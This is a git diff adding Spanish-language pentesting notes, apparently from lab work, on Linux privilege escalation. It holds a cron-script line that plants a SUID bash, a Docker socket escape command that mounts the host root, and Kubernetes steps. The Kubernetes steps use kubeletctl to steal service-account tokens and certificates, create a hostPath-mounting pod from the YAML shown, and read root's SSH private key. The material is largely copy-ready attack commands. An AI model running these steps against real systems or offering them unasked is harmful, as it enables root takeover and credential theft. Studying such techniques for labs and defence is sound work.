@@ -85,3 +85,47 @@ PATH ABUSE!!
     - Podemos modificar el script para que ejecute un reverse shell haciendo un echo reverse shell + un shift right `>>` al script.
     - `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /etc/cron.daily/script.sh`
     - `/tmp/bash -p` => root shell
+
+### Docker privilege escalation
+- La escalación de privilegios en Linux mediante Docker se basa en explotar configuraciones inseguras del demonio Docker. Un caso común ocurre cuando el socket de Docker `(/var/run/docker.sock)` es accesible por un usuario sin privilegios, lo que permite ejecutar contenedores con permisos elevados y, potencialmente, escapar al sistema host.
+- `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash`
+    -  Este comando ejecuta un contenedor Ubuntu en modo chroot, permitiendo ejecutar comandos en el sistema host.
+    - `docker -H unix:///var/run/docker.sock` Indica que Docker debe conectarse al socket UNIX `/var/run/docker.sock`, el cual es el punto de comunicación entre el cliente y el deamon de Docker.
+    - Si un usuario tiene acceso a este socket, puede controlar Docker como root.
+    - `run -v /:/mnt --rm -it ubuntu` Crea un contenedor Ubuntu en modo chroot, con acceso a la carpeta raíz del sistema host.
+    - `chroot /mnt bash` Ejecuta el comando bash en el contenedor Ubuntu, permitiendo ejecutar comandos en el sistema host.
+    - `--rm` Elimina el contenedor después de que se haya ejecutado el comando.
+
+### Kubernetes privilege escalation
+- Podemos utilizar la herramienta kubeletctl para obtener el token y certificado de la service account de Kubernetes del servidor.
+    - Para hacer esto tenemos que tener la IP del server, el namespace y pod target.
+- **Extract tokens** `kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token`
+- **Extract certificates** `kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
+- Ahora listamos privilegios:
+    - `export token=`cat k8.token``
+    - `kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list`
+- Ahora lo que podemos hacer es crear un YAML para crear un nuevo contenedor y montar el filesystem entero con la carpeta root adentro.
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc
+  namespace: default
+spec:
+  containers:
+  - name: privesc
+    image: nginx:1.14.2
+    volumeMounts:
+    - mountPath: /root
+      name: mount-root-into-mnt
+  volumes:
+  - name: mount-root-into-mnt
+    hostPath:
+       path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+```
+##### Creando nuevo pod
+- `kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml`
+- `kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc`
